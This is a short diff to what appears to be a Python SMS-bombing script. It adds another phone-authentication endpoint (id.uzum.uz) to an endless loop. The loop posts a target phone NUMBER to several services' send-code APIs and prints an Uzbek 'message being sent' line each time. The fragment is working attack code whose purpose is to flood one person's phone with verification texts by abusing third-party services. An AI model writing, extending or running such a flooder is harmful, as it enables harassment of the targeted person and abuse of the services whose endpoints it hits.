@@ -48,6 +48,12 @@ while True:
         time.sleep(1)
 
     try:
+        response = requests.post('https://id.uzum.uz/api/auth/phone', headers=headers, data={'phone' : NUMBER})
+        print(colored('* Xabar Yuborilmoqda', 'blue'))
+    except:
+        time.sleep(1)
+
+    try:
         response = requests.post('http://my.tcell.tj/api/v3/auth/send-code/', headers=headers, data={'phone' : NUMBER})
         print(colored('* Xabar Yuborilmoqda', 'blue'))
     except:
